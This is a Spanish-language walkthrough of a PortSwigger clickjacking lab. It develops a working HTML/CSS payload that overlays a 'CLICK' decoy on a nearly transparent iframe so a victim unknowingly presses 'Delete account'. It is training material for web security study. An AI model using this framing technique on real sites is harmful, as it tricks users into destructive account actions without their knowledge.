# Lab: Basic clickjacking with CSRF token protection

This lab contains login functionality and a delete account button that is protected by a CSRF token. A user will click on elements that display the word "click" on a decoy website.

To solve the lab, craft some HTML that frames the account page and fools the user into deleting their account. The lab is solved when the account is deleted.

You can log in to your own account using the following credentials: `wiener:peter`

`Note`: The victim will be using Chrome so test your exploit on that browser.

![Practitioner](https://img.shields.io/badge/level-Apprentice-green) 

---

Iniciamos el laboratorio y nos encontramos con un blog público:
![image](https://github.com/user-attachments/assets/4ffa4b57-b5df-4487-b5ff-9dda4fa0cea9)

Nosotros sabemos que este laboratorio tiene una funcionalidad de autenticación y que tiene un botón `Delete account` el cual debemos utilizar para que el usuario víctima elimine su cuenta mediante `Clickjacking`.

Nos autenticamos con nuestras credenciales `wiener:peter` y en el dashboard del usuario nos encontramos con el botón `Delete account`:
![image](https://github.com/user-attachments/assets/509e80c1-90ae-4260-b2a0-ecfa62034389)

Entonces la idea es engañar a un usuario para que haga clic en un elemento visible que muestra la palabra `click`, mientras un botón real (`Delete account`) del sitio objetivo se encuentra oculto detrás, embebido en un iframe casi transparente y alineado perfectamente con ese texto.

Accedemos al exploit server del laboratorio, que simula un sitio web alojado por nosotros:
![image](https://github.com/user-attachments/assets/514dc04f-5e9d-4952-91dd-0f2c40cc10fd)

Si hacemos click en `View exploit` seremos capaces de ver el contenido de nuestro sitio web:
![image](https://github.com/user-attachments/assets/2de4b3bc-2917-4c59-821f-231b080acf8f)

Vamos a utilizar un `iframe`, que es un elemento HTML que permite cargar otra página web dentro del documento actual. Ya lo vimos en laboratorios anteriores: el `iframe` incrusta contenido remoto, como si fuera una ventana dentro del sitio atacante.

Vamos a ir haciendo pruebas para analizar cómo va cambiando el código y el resultado que arroja. 

Comenzamos insertando el siguiente código en nuestra página:
```html
<iframe src="https://0aef009e0453d5f282da6b77000a0060.web-security-academy.net/my-account?id=wiener"></iframe>
```
Esto genera un cuadro embebido que carga la página especificada en el atributo `src`. Podemos ver visualmente que el contenido del `iframe` corresponde al dashboard del usuario:
![image](https://github.com/user-attachments/assets/c9df01fc-50a8-44f4-8875-eb0d31100bde)

Ahora procedemos a darle estilo al `iframe`:
```html
<style>
  iframe {
    position: relative;
    width: 1000px;
    height: 700px;
    opacity: 0.1;
    z-index: 2;
  }
</style>

<iframe src="https://0aef009e0453d5f282da6b77000a0060.web-security-academy.net/my-account?id=wiener"></iframe>

```

Vemos que se agrandó el `iframe`, incluso si acercamos el mouse sobre un elemento vemos que cambia el ícono, lo que nos da la pauta de que tenemos interacción con los elementos, es decir, los botones siguen funcionando por más que sean casi transparentes.

Ahora vamos a agregar un botón:

```html
<style>
  iframe {
    position: relative;
    width: 1000px;
    height: 700px;
    opacity: 0.1;
    z-index: 2;
  }
  div {
    position: absolute;
    top: 100px;
    left: 100px;
    z-index: 1;
  }
</style>

<div>click</div>
<iframe src="https://0aef009e0453d5f282da6b77000a0060.web-security-academy.net/my-account?id=wiener"></iframe>
```

Nosotros podemos ver el elemento `click`:
![image](https://github.com/user-attachments/assets/e742c0d5-1107-4742-b25d-7f712b948ce4)

La idea ahora es ir probando hasta encontrar la configuración de modo tal que el elemento `click` quede superpuesto al botón `Delete account`. Luego de varias pruebas encontramos que la configuración correcta es la siguiente:
```html
<style>
  iframe {
    position: relative;
    width: 1000px;
    height: 700px;
    opacity: 0.1;
    z-index: 2;
  }
  div {
    position: absolute;
    top: 515px;
    left: 60px;
    z-index: 1;
  }
</style>

<div>CLICK</div>
<iframe src="https://0aef009e0453d5f282da6b77000a0060.web-security-academy.net/my-account?id=wiener"></iframe>
```

![image](https://github.com/user-attachments/assets/97c77e35-9026-4ac1-a168-f7ea83709db6)

Ahora procedemos a bajar la transparencia de modo que el `iframe` quede casi imperceptible:
```html
<style>
  iframe {
    position: relative;
    width: 1000px;
    height: 700px;
    opacity: 0.000001;
    z-index: 2;
  }
  div {
    position: absolute;
    top: 515px;
    left: 60px;
    z-index: 1;
  }
</style>

<div>CLICK</div>
<iframe src="https://0aef009e0453d5f282da6b77000a0060.web-security-academy.net/my-account?id=wiener"></iframe>
```
De modo tal que si la víctima visita esta página, verá lo siguiente:
![image](https://github.com/user-attachments/assets/edca2881-3f92-40ca-9583-0aceacf2d34b)

